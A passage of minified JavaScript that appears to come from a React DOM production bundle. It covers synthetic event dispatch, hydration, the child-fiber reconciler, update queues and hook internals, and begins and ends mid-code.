k(d,u+"enter",w,n,p),k.target=f,k.relatedTarget=F,g=k),F=g,S&&w)t:{for(k=S,d=w,u=0,f=k;f;f=Lt(f))u++;for(f=0,g=d;g;g=Lt(g))f++;for(;0<u-f;)k=Lt(k),u--;for(;0<f-u;)d=Lt(d),f--;for(;u--;){if(k===d||d!==null&&k===d.alternate)break t;k=Lt(k),d=Lt(d)}k=null}else k=null;S!==null&&ds(h,m,S,k,!1),w!==null&&F!==null&&ds(h,F,w,k,!0)}}e:{if(m=c?Ht(c):window,S=m.nodeName&&m.nodeName.toLowerCase(),S==="select"||S==="input"&&m.type==="file")var T=Id;else if(rs(m))if(Wa)T=Hd;else{T=Fd;var E=Ad}else(S=m.nodeName)&&S.toLowerCase()==="input"&&(m.type==="checkbox"||m.type==="radio")&&(T=zd);if(T&&(T=T(e,c))){Ua(h,T,n,p);break e}E&&E(e,m,c),e==="focusout"&&(E=m._wrapperState)&&E.controlled&&m.type==="number"&&nl(m,"number",m.value)}switch(E=c?Ht(c):window,e){case"focusin":(rs(E)||E.contentEditable==="true")&&(Ft=E,ml=c,jn=null);break;case"focusout":jn=ml=Ft=null;break;case"mousedown":hl=!0;break;case"contextmenu":case"mouseup":case"dragend":hl=!1,as(h,n,p);break;case"selectionchange":if(Vd)break;case"keydown":case"keyup":as(h,n,p)}var P;if(li)e:{switch(e){case"compositionstart":var j="onCompositionStart";break e;case"compositionend":j="onCompositionEnd";break e;case"compositionupdate":j="onCompositionUpdate";break e}j=void 0}else At?za(e,n)&&(j="onCompositionEnd"):e==="keydown"&&n.keyCode===229&&(j="onCompositionStart");j&&(Fa&&n.locale!=="ko"&&(At||j!=="onCompositionStart"?j==="onCompositionEnd"&&At&&(P=Aa()):(tt=p,ni="value"in tt?tt.value:tt.textContent,At=!0)),E=zr(c,j),0<E.length&&(j=new qi(j,e,null,n,p),h.push({event:j,listeners:E}),P?j.data=P:(P=Ha(n),P!==null&&(j.data=P)))),(P=Md?Od(e,n):Ld(e,n))&&(c=zr(c,"onBeforeInput"),0<c.length&&(p=new qi("onBeforeInput","beforeinput",null,n,p),h.push({event:p,listeners:c}),p.data=P))}Ya(h,t)})}function Wn(e,t,n){return{instance:e,listener:t,currentTarget:n}}function zr(e,t){for(var n=t+"Capture",r=[];e!==null;){var o=e,l=o.stateNode;o.tag===5&&l!==null&&(o=l,l=_n(e,n),l!=null&&r.unshift(Wn(e,l,o)),l=_n(e,t),l!=null&&r.push(Wn(e,l,o))),e=e.return}return r}function Lt(e){if(e===null)return null;do e=e.return;while(e&&e.tag!==5);return e||null}function ds(e,t,n,r,o){for(var l=t._reactName,i=[];n!==null&&n!==r;){var s=n,a=s.alternate,c=s.stateNode;if(a!==null&&a===r)break;s.tag===5&&c!==null&&(s=c,o?(a=_n(n,l),a!=null&&i.unshift(Wn(n,a,s))):o||(a=_n(n,l),a!=null&&i.push(Wn(n,a,s)))),n=n.return}i.length!==0&&e.push({event:t,listeners:i})}var Kd=/\r\n?/g,Qd=/\u0000|\uFFFD/g;function fs(e){return(typeof e=="string"?e:""+e).replace(Kd,`
`).replace(Qd,"")}function fr(e,t,n){if(t=fs(t),fs(e)!==t&&n)throw Error(v(425))}function Hr(){}var gl=null,vl=null;function yl(e,t){return e==="textarea"||e==="noscript"||typeof t.children=="string"||typeof t.children=="number"||typeof t.dangerouslySetInnerHTML=="object"&&t.dangerouslySetInnerHTML!==null&&t.dangerouslySetInnerHTML.__html!=null}var Sl=typeof setTimeout=="function"?setTimeout:void 0,Gd=typeof clearTimeout=="function"?clearTimeout:void 0,ps=typeof Promise=="function"?Promise:void 0,bd=typeof queueMicrotask=="function"?queueMicrotask:typeof ps<"u"?function(e){return ps.resolve(null).then(e).catch(Xd)}:Sl;function Xd(e){setTimeout(function(){throw e})}function zo(e,t){var n=t,r=0;do{var o=n.nextSibling;if(e.removeChild(n),o&&o.nodeType===8)if(n=o.data,n==="/$"){if(r===0){e.removeChild(o),Fn(t);return}r--}else n!=="$"&&n!=="$?"&&n!=="$!"||r++;n=o}while(n);Fn(t)}function it(e){for(;e!=null;e=e.nextSibling){var t=e.nodeType;if(t===1||t===3)break;if(t===8){if(t=e.data,t==="$"||t==="$!"||t==="$?")break;if(t==="/$")return null}}return e}function ms(e){e=e.previousSibling;for(var t=0;e;){if(e.nodeType===8){var n=e.data;if(n==="$"||n==="$!"||n==="$?"){if(t===0)return e;t--}else n==="/$"&&t++}e=e.previousSibling}return null}var an=Math.random().toString(36).slice(2),Fe="__reactFiber$"+an,Vn="__reactProps$"+an,Ke="__reactContainer$"+an,wl="__reactEvents$"+an,Yd="__reactListeners$"+an,Zd="__reactHandles$"+an;function wt(e){var t=e[Fe];if(t)return t;for(var n=e.parentNode;n;){if(t=n[Ke]||n[Fe]){if(n=t.alternate,t.child!==null||n!==null&&n.child!==null)for(e=ms(e);e!==null;){if(n=e[Fe])return n;e=ms(e)}return t}e=n,n=e.parentNode}return null}function Zn(e){return e=e[Fe]||e[Ke],!e||e.tag!==5&&e.tag!==6&&e.tag!==13&&e.tag!==3?null:e}function Ht(e){if(e.tag===5||e.tag===6)return e.stateNode;throw Error(v(33))}function so(e){return e[Vn]||null}var kl=[],Ut=-1;function mt(e){return{current:e}}function A(e){0>Ut||(e.current=kl[Ut],kl[Ut]=null,Ut--)}function _(e,t){Ut++,kl[Ut]=e.current,e.current=t}var ft={},oe=mt(ft),de=mt(!1),Et=ft;function qt(e,t){var n=e.type.contextTypes;if(!n)return ft;var r=e.stateNode;if(r&&r.__reactInternalMemoizedUnmaskedChildContext===t)return r.__reactInternalMemoizedMaskedChildContext;var o={},l;for(l in n)o[l]=t[l];return r&&(e=e.stateNode,e.__reactInternalMemoizedUnmaskedChildContext=t,e.__reactInternalMemoizedMaskedChildContext=o),o}function fe(e){return e=e.childContextTypes,e!=null}function Ur(){A(de),A(oe)}function hs(e,t,n){if(oe.current!==ft)throw Error(v(168));_(oe,t),_(de,n)}function qa(e,t,n){var r=e.stateNode;if(t=t.childContextTypes,typeof r.getChildContext!="function")return n;r=r.getChildContext();for(var o in r)if(!(o in t))throw Error(v(108,Ac(e)||"Unknown",o));return W({},n,r)}function Wr(e){return e=(e=e.stateNode)&&e.__reactInternalMemoizedMergedChildContext||ft,Et=oe.current,_(oe,e),_(de,de.current),!0}function gs(e,t,n){var r=e.stateNode;if(!r)throw Error(v(169));n?(e=qa(e,t,Et),r.__reactInternalMemoizedMergedChildContext=e,A(de),A(oe),_(oe,e)):A(de),_(de,n)}var We=null,ao=!1,Ho=!1;function eu(e){We===null?We=[e]:We.push(e)}function qd(e){ao=!0,eu(e)}function ht(){if(!Ho&&We!==null){Ho=!0;var e=0,t=D;try{var n=We;for(D=1;e<n.length;e++){var r=n[e];do r=r(!0);while(r!==null)}We=null,ao=!1}catch(o){throw We!==null&&(We=We.slice(e+1)),Ea(Zl,ht),o}finally{D=t,Ho=!1}}return null}var Wt=[],Vt=0,Vr=null,Br=0,we=[],ke=0,Pt=null,Ve=1,Be="";function yt(e,t){Wt[Vt++]=Br,Wt[Vt++]=Vr,Vr=e,Br=t}function tu(e,t,n){we[ke++]=Ve,we[ke++]=Be,we[ke++]=Pt,Pt=e;var r=Ve;e=Be;var o=32-Le(r)-1;r&=~(1<<o),n+=1;var l=32-Le(t)+o;if(30<l){var i=o-o%5;l=(r&(1<<i)-1).toString(32),r>>=i,o-=i,Ve=1<<32-Le(t)+o|n<<o|r,Be=l+e}else Ve=1<<l|n<<o|r,Be=e}function si(e){e.return!==null&&(yt(e,1),tu(e,1,0))}function ai(e){for(;e===Vr;)Vr=Wt[--Vt],Wt[Vt]=null,Br=Wt[--Vt],Wt[Vt]=null;for(;e===Pt;)Pt=we[--ke],we[ke]=null,Be=we[--ke],we[ke]=null,Ve=we[--ke],we[ke]=null}var ge=null,he=null,z=!1,Me=null;function nu(e,t){var n=Ce(5,null,null,0);n.elementType="DELETED",n.stateNode=t,n.return=e,t=e.deletions,t===null?(e.deletions=[n],e.flags|=16):t.push(n)}function vs(e,t){switch(e.tag){case 5:var n=e.type;return t=t.nodeType!==1||n.toLowerCase()!==t.nodeName.toLowerCase()?null:t,t!==null?(e.stateNode=t,ge=e,he=it(t.firstChild),!0):!1;case 6:return t=e.pendingProps===""||t.nodeType!==3?null:t,t!==null?(e.stateNode=t,ge=e,he=null,!0):!1;case 13:return t=t.nodeType!==8?null:t,t!==null?(n=Pt!==null?{id:Ve,overflow:Be}:null,e.memoizedState={dehydrated:t,treeContext:n,retryLane:1073741824},n=Ce(18,null,null,0),n.stateNode=t,n.return=e,e.child=n,ge=e,he=null,!0):!1;default:return!1}}function Cl(e){return(e.mode&1)!==0&&(e.flags&128)===0}function Tl(e){if(z){var t=he;if(t){var n=t;if(!vs(e,t)){if(Cl(e))throw Error(v(418));t=it(n.nextSibling);var r=ge;t&&vs(e,t)?nu(r,n):(e.flags=e.flags&-4097|2,z=!1,ge=e)}}else{if(Cl(e))throw Error(v(418));e.flags=e.flags&-4097|2,z=!1,ge=e}}}function ys(e){for(e=e.return;e!==null&&e.tag!==5&&e.tag!==3&&e.tag!==13;)e=e.return;ge=e}function pr(e){if(e!==ge)return!1;if(!z)return ys(e),z=!0,!1;var t;if((t=e.tag!==3)&&!(t=e.tag!==5)&&(t=e.type,t=t!=="head"&&t!=="body"&&!yl(e.type,e.memoizedProps)),t&&(t=he)){if(Cl(e))throw ru(),Error(v(418));for(;t;)nu(e,t),t=it(t.nextSibling)}if(ys(e),e.tag===13){if(e=e.memoizedState,e=e!==null?e.dehydrated:null,!e)throw Error(v(317));e:{for(e=e.nextSibling,t=0;e;){if(e.nodeType===8){var n=e.data;if(n==="/$"){if(t===0){he=it(e.nextSibling);break e}t--}else n!=="$"&&n!=="$!"&&n!=="$?"||t++}e=e.nextSibling}he=null}}else he=ge?it(e.stateNode.nextSibling):null;return!0}function ru(){for(var e=he;e;)e=it(e.nextSibling)}function en(){he=ge=null,z=!1}function ui(e){Me===null?Me=[e]:Me.push(e)}var ef=be.ReactCurrentBatchConfig;function gn(e,t,n){if(e=n.ref,e!==null&&typeof e!="function"&&typeof e!="object"){if(n._owner){if(n=n._owner,n){if(n.tag!==1)throw Error(v(309));var r=n.stateNode}if(!r)throw Error(v(147,e));var o=r,l=""+e;return t!==null&&t.ref!==null&&typeof t.ref=="function"&&t.ref._stringRef===l?t.ref:(t=function(i){var s=o.refs;i===null?delete s[l]:s[l]=i},t._stringRef=l,t)}if(typeof e!="string")throw Error(v(284));if(!n._owner)throw Error(v(290,e))}return e}function mr(e,t){throw e=Object.prototype.toString.call(t),Error(v(31,e==="[object Object]"?"object with keys {"+Object.keys(t).join(", ")+"}":e))}function Ss(e){var t=e._init;return t(e._payload)}function ou(e){function t(d,u){if(e){var f=d.deletions;f===null?(d.deletions=[u],d.flags|=16):f.push(u)}}function n(d,u){if(!e)return null;for(;u!==null;)t(d,u),u=u.sibling;return null}function r(d,u){for(d=new Map;u!==null;)u.key!==null?d.set(u.key,u):d.set(u.index,u),u=u.sibling;return d}function o(d,u){return d=ct(d,u),d.index=0,d.sibling=null,d}function l(d,u,f){return d.index=f,e?(f=d.alternate,f!==null?(f=f.index,f<u?(d.flags|=2,u):f):(d.flags|=2,u)):(d.flags|=1048576,u)}function i(d){return e&&d.alternate===null&&(d.flags|=2),d}function s(d,u,f,g){return u===null||u.tag!==6?(u=Ko(f,d.mode,g),u.return=d,u):(u=o(u,f),u.return=d,u)}function a(d,u,f,g){var T=f.type;return T===It?p(d,u,f.props.children,g,f.key):u!==null&&(u.elementType===T||typeof T=="object"&&T!==null&&T.$$typeof===Ye&&Ss(T)===u.type)?(g=o(u,f.props),g.ref=gn(d,u,f),g.return=d,g):(g=Mr(f.type,f.key,f.props,null,d.mode,g),g.ref=gn(d,u,f),g.return=d,g)}function c(d,u,f,g){return u===null||u.tag!==4||u.stateNode.containerInfo!==f.containerInfo||u.stateNode.implementation!==f.implementation?(u=Qo(f,d.mode,g),u.return=d,u):(u=o(u,f.children||[]),u.return=d,u)}function p(d,u,f,g,T){return u===null||u.tag!==7?(u=xt(f,d.mode,g,T),u.return=d,u):(u=o(u,f),u.return=d,u)}function h(d,u,f){if(typeof u=="string"&&u!==""||typeof u=="number")return u=Ko(""+u,d.mode,f),u.return=d,u;if(typeof u=="object"&&u!==null){switch(u.$$typeof){case rr:return f=Mr(u.type,u.key,u.props,null,d.mode,f),f.ref=gn(d,null,u),f.return=d,f;case _t:return u=Qo(u,d.mode,f),u.return=d,u;case Ye:var g=u._init;return h(d,g(u._payload),f)}if(wn(u)||dn(u))return u=xt(u,d.mode,f,null),u.return=d,u;mr(d,u)}return null}function m(d,u,f,g){var T=u!==null?u.key:null;if(typeof f=="string"&&f!==""||typeof f=="number")return T!==null?null:s(d,u,""+f,g);if(typeof f=="object"&&f!==null){switch(f.$$typeof){case rr:return f.key===T?a(d,u,f,g):null;case _t:return f.key===T?c(d,u,f,g):null;case Ye:return T=f._init,m(d,u,T(f._payload),g)}if(wn(f)||dn(f))return T!==null?null:p(d,u,f,g,null);mr(d,f)}return null}function S(d,u,f,g,T){if(typeof g=="string"&&g!==""||typeof g=="number")return d=d.get(f)||null,s(u,d,""+g,T);if(typeof g=="object"&&g!==null){switch(g.$$typeof){case rr:return d=d.get(g.key===null?f:g.key)||null,a(u,d,g,T);case _t:return d=d.get(g.key===null?f:g.key)||null,c(u,d,g,T);case Ye:var E=g._init;return S(d,u,f,E(g._payload),T)}if(wn(g)||dn(g))return d=d.get(f)||null,p(u,d,g,T,null);mr(u,g)}return null}function w(d,u,f,g){for(var T=null,E=null,P=u,j=u=0,B=null;P!==null&&j<f.length;j++){P.index>j?(B=P,P=null):B=P.sibling;var O=m(d,P,f[j],g);if(O===null){P===null&&(P=B);break}e&&P&&O.alternate===null&&t(d,P),u=l(O,u,j),E===null?T=O:E.sibling=O,E=O,P=B}if(j===f.length)return n(d,P),z&&yt(d,j),T;if(P===null){for(;j<f.length;j++)P=h(d,f[j],g),P!==null&&(u=l(P,u,j),E===null?T=P:E.sibling=P,E=P);return z&&yt(d,j),T}for(P=r(d,P);j<f.length;j++)B=S(P,d,j,f[j],g),B!==null&&(e&&B.alternate!==null&&P.delete(B.key===null?j:B.key),u=l(B,u,j),E===null?T=B:E.sibling=B,E=B);return e&&P.forEach(function(Pe){return t(d,Pe)}),z&&yt(d,j),T}function k(d,u,f,g){var T=dn(f);if(typeof T!="function")throw Error(v(150));if(f=T.call(f),f==null)throw Error(v(151));for(var E=T=null,P=u,j=u=0,B=null,O=f.next();P!==null&&!O.done;j++,O=f.next()){P.index>j?(B=P,P=null):B=P.sibling;var Pe=m(d,P,O.value,g);if(Pe===null){P===null&&(P=B);break}e&&P&&Pe.alternate===null&&t(d,P),u=l(Pe,u,j),E===null?T=Pe:E.sibling=Pe,E=Pe,P=B}if(O.done)return n(d,P),z&&yt(d,j),T;if(P===null){for(;!O.done;j++,O=f.next())O=h(d,O.value,g),O!==null&&(u=l(O,u,j),E===null?T=O:E.sibling=O,E=O);return z&&yt(d,j),T}for(P=r(d,P);!O.done;j++,O=f.next())O=S(P,d,j,O.value,g),O!==null&&(e&&O.alternate!==null&&P.delete(O.key===null?j:O.key),u=l(O,u,j),E===null?T=O:E.sibling=O,E=O);return e&&P.forEach(function(un){return t(d,un)}),z&&yt(d,j),T}function F(d,u,f,g){if(typeof f=="object"&&f!==null&&f.type===It&&f.key===null&&(f=f.props.children),typeof f=="object"&&f!==null){switch(f.$$typeof){case rr:e:{for(var T=f.key,E=u;E!==null;){if(E.key===T){if(T=f.type,T===It){if(E.tag===7){n(d,E.sibling),u=o(E,f.props.children),u.return=d,d=u;break e}}else if(E.elementType===T||typeof T=="object"&&T!==null&&T.$$typeof===Ye&&Ss(T)===E.type){n(d,E.sibling),u=o(E,f.props),u.ref=gn(d,E,f),u.return=d,d=u;break e}n(d,E);break}else t(d,E);E=E.sibling}f.type===It?(u=xt(f.props.children,d.mode,g,f.key),u.return=d,d=u):(g=Mr(f.type,f.key,f.props,null,d.mode,g),g.ref=gn(d,u,f),g.return=d,d=g)}return i(d);case _t:e:{for(E=f.key;u!==null;){if(u.key===E)if(u.tag===4&&u.stateNode.containerInfo===f.containerInfo&&u.stateNode.implementation===f.implementation){n(d,u.sibling),u=o(u,f.children||[]),u.return=d,d=u;break e}else{n(d,u);break}else t(d,u);u=u.sibling}u=Qo(f,d.mode,g),u.return=d,d=u}return i(d);case Ye:return E=f._init,F(d,u,E(f._payload),g)}if(wn(f))return w(d,u,f,g);if(dn(f))return k(d,u,f,g);mr(d,f)}return typeof f=="string"&&f!==""||typeof f=="number"?(f=""+f,u!==null&&u.tag===6?(n(d,u.sibling),u=o(u,f),u.return=d,d=u):(n(d,u),u=Ko(f,d.mode,g),u.return=d,d=u),i(d)):n(d,u)}return F}var tn=ou(!0),lu=ou(!1),Jr=mt(null),$r=null,Bt=null,ci=null;function di(){ci=Bt=$r=null}function fi(e){var t=Jr.current;A(Jr),e._currentValue=t}function xl(e,t,n){for(;e!==null;){var r=e.alternate;if((e.childLanes&t)!==t?(e.childLanes|=t,r!==null&&(r.childLanes|=t)):r!==null&&(r.childLanes&t)!==t&&(r.childLanes|=t),e===n)break;e=e.return}}function Xt(e,t){$r=e,ci=Bt=null,e=e.dependencies,e!==null&&e.firstContext!==null&&(e.lanes&t&&(ce=!0),e.firstContext=null)}function xe(e){var t=e._currentValue;if(ci!==e)if(e={context:e,memoizedValue:t,next:null},Bt===null){if($r===null)throw Error(v(308));Bt=e,$r.dependencies={lanes:0,firstContext:e}}else Bt=Bt.next=e;return t}var kt=null;function pi(e){kt===null?kt=[e]:kt.push(e)}function iu(e,t,n,r){var o=t.interleaved;return o===null?(n.next=n,pi(t)):(n.next=o.next,o.next=n),t.interleaved=n,Qe(e,r)}function Qe(e,t){e.lanes|=t;var n=e.alternate;for(n!==null&&(n.lanes|=t),n=e,e=e.return;e!==null;)e.childLanes|=t,n=e.alternate,n!==null&&(n.childLanes|=t),n=e,e=e.return;return n.tag===3?n.stateNode:null}var Ze=!1;function mi(e){e.updateQueue={baseState:e.memoizedState,firstBaseUpdate:null,lastBaseUpdate:null,shared:{pending:null,interleaved:null,lanes:0},effects:null}}function su(e,t){e=e.updateQueue,t.updateQueue===e&&(t.updateQueue={baseState:e.baseState,firstBaseUpdate:e.firstBaseUpdate,lastBaseUpdate:e.lastBaseUpdate,shared:e.shared,effects:e.effects})}function Je(e,t){return{eventTime:e,lane:t,tag:0,payload:null,callback:null,next:null}}function st(e,t,n){var r=e.updateQueue;if(r===null)return null;if(r=r.shared,L&2){var o=r.pending;return o===null?t.next=t:(t.next=o.next,o.next=t),r.pending=t,Qe(e,n)}return o=r.interleaved,o===null?(t.next=t,pi(r)):(t.next=o.next,o.next=t),r.interleaved=t,Qe(e,n)}function xr(e,t,n){if(t=t.updateQueue,t!==null&&(t=t.shared,(n&4194240)!==0)){var r=t.lanes;r&=e.pendingLanes,n|=r,t.lanes=n,ql(e,n)}}function ws(e,t){var n=e.updateQueue,r=e.alternate;if(r!==null&&(r=r.updateQueue,n===r)){var o=null,l=null;if(n=n.firstBaseUpdate,n!==null){do{var i={eventTime:n.eventTime,lane:n.lane,tag:n.tag,payload:n.payload,callback:n.callback,next:null};l===null?o=l=i:l=l.next=i,n=n.next}while(n!==null);l===null?o=l=t:l=l.next=t}else o=l=t;n={baseState:r.baseState,firstBaseUpdate:o,lastBaseUpdate:l,shared:r.shared,effects:r.effects},e.updateQueue=n;return}e=n.lastBaseUpdate,e===null?n.firstBaseUpdate=t:e.next=t,n.lastBaseUpdate=t}function Kr(e,t,n,r){var o=e.updateQueue;Ze=!1;var l=o.firstBaseUpdate,i=o.lastBaseUpdate,s=o.shared.pending;if(s!==null){o.shared.pending=null;var a=s,c=a.next;a.next=null,i===null?l=c:i.next=c,i=a;var p=e.alternate;p!==null&&(p=p.updateQueue,s=p.lastBaseUpdate,s!==i&&(s===null?p.firstBaseUpdate=c:s.next=c,p.lastBaseUpdate=a))}if(l!==null){var h=o.baseState;i=0,p=c=a=null,s=l;do{var m=s.lane,S=s.eventTime;if((r&m)===m){p!==null&&(p=p.next={eventTime:S,lane:0,tag:s.tag,payload:s.payload,callback:s.callback,next:null});e:{var w=e,k=s;switch(m=t,S=n,k.tag){case 1:if(w=k.payload,typeof w=="function"){h=w.call(S,h,m);break e}h=w;break e;case 3:w.flags=w.flags&-65537|128;case 0:if(w=k.payload,m=typeof w=="function"?w.call(S,h,m):w,m==null)break e;h=W({},h,m);break e;case 2:Ze=!0}}s.callback!==null&&s.lane!==0&&(e.flags|=64,m=o.effects,m===null?o.effects=[s]:m.push(s))}else S={eventTime:S,lane:m,tag:s.tag,payload:s.payload,callback:s.callback,next:null},p===null?(c=p=S,a=h):p=p.next=S,i|=m;if(s=s.next,s===null){if(s=o.shared.pending,s===null)break;m=s,s=m.next,m.next=null,o.lastBaseUpdate=m,o.shared.pending=null}}while(!0);if(p===null&&(a=h),o.baseState=a,o.firstBaseUpdate=c,o.lastBaseUpdate=p,t=o.shared.interleaved,t!==null){o=t;do i|=o.lane,o=o.next;while(o!==t)}else l===null&&(o.shared.lanes=0);Rt|=i,e.lanes=i,e.memoizedState=h}}function ks(e,t,n){if(e=t.effects,t.effects=null,e!==null)for(t=0;t<e.length;t++){var r=e[t],o=r.callback;if(o!==null){if(r.callback=null,r=n,typeof o!="function")throw Error(v(191,o));o.call(r)}}}var qn={},He=mt(qn),Bn=mt(qn),Jn=mt(qn);function Ct(e){if(e===qn)throw Error(v(174));return e}function hi(e,t){switch(_(Jn,t),_(Bn,e),_(He,qn),e=t.nodeType,e){case 9:case 11:t=(t=t.documentElement)?t.namespaceURI:ol(null,"");break;default:e=e===8?t.parentNode:t,t=e.namespaceURI||null,e=e.tagName,t=ol(t,e)}A(He),_(He,t)}function nn(){A(He),A(Bn),A(Jn)}function au(e){Ct(Jn.current);var t=Ct(He.current),n=ol(t,e.type);t!==n&&(_(Bn,e),_(He,n))}function gi(e){Bn.current===e&&(A(He),A(Bn))}var H=mt(0);function Qr(e){for(var t=e;t!==null;){if(t.tag===13){var n=t.memoizedState;if(n!==null&&(n=n.dehydrated,n===null||n.data==="$?"||n.data==="$!"))return t}else if(t.tag===19&&t.memoizedProps.revealOrder!==void 0){if(t.flags&128)return t}else if(t.child!==null){t.child.return=t,t=t.child;continue}if(t===e)break;for(;t.sibling===null;){if(t.return===null||t.return===e)return null;t=t.return}t.sibling.return=t.return,t=t.sibling}return null}var Uo=[];function vi(){for(var e=0;e<Uo.length;e++)Uo[e]._workInProgressVersionPrimary=null;Uo.length=0}var Er=be.ReactCurrentDispatcher,Wo=be.ReactCurrentBatchConfig,jt=0,U=null,Q=null,X=null,Gr=!1,Rn=!1,$n=0,tf=0;function te(){throw Error(v(321))}function yi(e,t){if(t===null)return!1;for(var n=0;n<t.length&&n<e.length;n++)if(!_e(e[n],t[n]))return!1;return!0}function Si(e,t,n,r,o,l){if(jt=l,U=t,t.memoizedState=null,t.updateQueue=null,t.lanes=0,Er.current=e===null||e.memoizedState===null?lf:sf,e=n(r,o),Rn){l=0;do{if(Rn=!1,$n=0,25<=l)throw Error(v(301));l+=1,X=Q=null,t.updateQueue=null,Er.current=af,e=n(r,o)}while(Rn)}if(Er.current=br,t=Q!==null&&Q.next!==null,jt=0,X=Q=U=null,Gr=!1,t)throw Error(v(300));return e}function wi(){var e=$n!==0;return $n=0,e}function Ae(){var e={memoizedState:null,baseState:null,baseQueue:null,queue:null,next:null};return X===null?U.memoizedState=X=e:X=X.next=e,X}function Ee(){if(Q===null){var e=U.alternate;e=e!==null?e.memoizedState:null}else e=Q.next;var t=X===null?U.memoizedState:X.next;if(t!==null)X=t,Q=e;else{if(e===null)throw Error(v(310));Q=e,e={memoizedState:Q.memoizedState,baseState:Q.baseState,baseQueue:Q.baseQueue,queue:Q.queue,next:null},X===null?U.memoizedState=X=e:X=X.next=e}return X}function Kn(e,t){return typeof t=="function"?t(e):t}function Vo(e){var t=Ee(),n=t.queue;if(n===null)throw Error(v(311));n.lastRenderedReducer=e;var r=Q,o=r.baseQueue,l=n.pending;if(l!==null){if(o!==null){var i=o.next;o.next=l.next,l.next=i}r.baseQueue=o=l,n.pending=null}if(o!==null){l=o.next,r=r.baseState;var s=i=null,a=null,c=l;do{var p=c.lane;if((jt&p)===p)a!==null&&(a=a.next={lane:0,action:c.action,hasEagerState:c.hasEagerState,eagerState:c.eagerState,next:null}),r=c.hasEagerState?c.eagerState:e(r,c.action);else{var h={lane:p,action:c.action,hasEagerState:c.hasEagerState,eagerState:c.eagerState,next:null};a===null?(s=a=h,i=r):a=a.next=h,U.lanes|=p,Rt|=p}c=c.next}while(c!==null&&c!==l);a===null?i=r:a.next=s,_e(r,t.memoizedState)||(ce=!0),t.memoizedState=r,t.baseState=i,t.baseQueue=a,n.lastRenderedState=r}if(e=n.interleaved,e!==null){o=e;do l=o.lane,U.lanes|=l,Rt|=l,o=o.next;while(o!==e)}else o===null&&(n.lanes=0);return[t.memoizedState,n.dispatch]}function Bo(e){var t=Ee(),n=t.queue;if(n===null)throw Error(v(311));n.lastRenderedReducer=e;var r=n.dispatch,o=n.pending,l=t.memoizedState;if(o!==null){n.pending=null;var i=o=o.next;do l=e(l,i.action),i=i.next;while(i!==o);_e(l,t.memoizedState)||(ce=!0),t.memoizedState=l,t.baseQueue===null&&(t.baseState=l),n.lastRenderedState=l}return[l,r]}function uu(){}function cu(e,t){var n=U,r=Ee(),o=t(),l=!_e(r.memoizedState,o);if(l&&(r.memoizedState=o,ce=!0),r=r.queue,ki(pu.bind(null,n,r,e),[e]),r.getSnapshot!==t||l||X!==null&&X.memoizedState.tag&1){if(n.flags|=2048,Qn(9,fu.bind(null,n,r,o,t),void 0,null),Y===null)throw Error(v(349));jt&30||du(n,t,o)}return o}function du(e,t,n){e.flags|=16384,e={getSnapshot:t,value:n},t=U.updateQueue,t===null?(t={lastEffect:null,stores:null},U.updateQueue=t,t.stores=[e]):(n=t.stores,n===null?t.stores=[e]:n.push(e))}function fu(e,t,n,r){t.value=n,t.getSnapshot=r,mu(t)&&hu(e)}function pu(e,t,n){return n(function(){mu(t)&&hu(e)})}function mu(e){var t=e.getSnapshot;e=e.value;try{var n=t();return!_e(e,n)}catch{return!0}}function hu(e){var t=Qe(e,1);t!==null&&De(t,e,1,-1)}function Cs(e){var t=Ae();return typeof e=="function"&&(e=e()),t.memoizedState=t.baseState=e,e={pending:null,interleaved:null,lanes:0,dispatch:null,lastRenderedReducer:Kn,lastRenderedState:e},t.queue=e,e=e.dispatch=of.bind(null,U,e),[t.memoizedState,e]}function Qn(e,t,n,r){return e={tag:e,create:t,destroy:n,deps:r,next:null},t=U.updateQueue,t===null?(t={lastEffect:null,stores:null},U.updateQueue=t,t.lastEffect=e.next=e):(n=t.lastEffect,n===null?t.lastEffect=e.next=e:(r=n.next,n.next=e,e.next=r,t.lastEffect=e)),e}function gu(){return Ee().memoizedState}function Pr(e,t,n,r){var o=Ae();U.flags|=e,o.memoizedState=Qn(1|t,n,void 0,r===void 0?null:r)}function uo(e,t,n,r){var o=Ee();r=r===void 0?null:r;var l=void 0;if(Q!==null){var i=Q.memoizedState;if(l=i.destroy,r!==null&&yi(r,i.deps)){o.memoizedState=Qn(t,n,l,r);return}}U.flags|=e,o.memoizedState=Qn(1|t,n,l,r)}function Ts(e,t){return Pr(8390656,8,e,t)}function ki(e,t){return uo(2048,8,e,t)}function vu(e,t){return uo(4,2,e,t)}function yu(e,t){return uo(4,4,e,t)}function Su(e,t){if(typeof t=="function")return e=e(),t(e),function(){t(null)};if(t!=null)return e=e(),t.current=e,function(){t.current=null}}function wu(e,t,n){return n=n!=null?n.concat([e]):null,uo(4,4,Su.bind(null,t,e),n)}function Ci(){}function ku(e,t){var n=Ee();t=t===void 0?null:t;var r=n.memoizedState;return r!==null&&t!==null&&yi(t,r[1])?r[0]:(n.memoizedState=[e,t],e)}function Cu(e,t){var n=Ee();t=t===void 0?null:t;var r=n.memoizedState;return r!==null&&t!==null&&yi(t,r[1])?r[0]:(e=e(),n.memoizedState=[e,t],e)}function Tu(e,t,n){return jt&21?(_e(n,t)||(n=Ra(),U.lanes|=n,Rt|=n,e.baseState=!0),t):(e.baseState&&(e.baseState=!1,ce=!0),e.memoizedState=n)}function nf(e,t){var n=D;D=n!==0&&4>n?n:4,e(!0);var r=Wo.transition;Wo.transition={};try{e(!1),t()}finally{D=n,Wo.transition=r}}function xu(){return Ee().memoizedState}function rf(e,t,n){var r=ut(e);if(n={lane:r,action:n,hasEagerState:!1,eagerState:null,next:null},Eu(e))Pu(t,n);else if(n=iu(e,t,n,r),n!==null){var o=ie();De(n,e,r,o),ju(n,t,r)}}function of(e,t,n){var r=ut(e),o={lane:r,action:n,hasEagerState:!1,eagerState:null,next:null};if(Eu(e))Pu(t,o);else{var l=e.alternate;if(e.lanes===0&&(l===null||l.lanes===0)&&(l=t.lastRenderedReducer,l!==null))try{var i=t.lastRenderedState,s=l(i,n);if(o.hasEagerState=!0,o.eagerState=s,_e(s,i)){var a=t.interleaved;a===null?(o.next=o,pi(t)):(o.next=a.next,a.next=o),t.interleaved=o;return}}catch{}finally{}n=iu(e,t,o,r),n!==null&&(o=ie(),De(n,e,r,o),ju(n,t,r))}}function Eu(e){var t=e.alternate;return e===U||t!==null&&t===U}function Pu(e,t){Rn=Gr=!0;var n=e.pending;n===null?t.next=t:(t.next=n.next,n.next=t),e.pending=t}function ju(e,t,n){if(n&4194240){var r=t.lanes;r&=e.pendingLanes,n|=r,t.lanes=n,ql(e,n)}}var 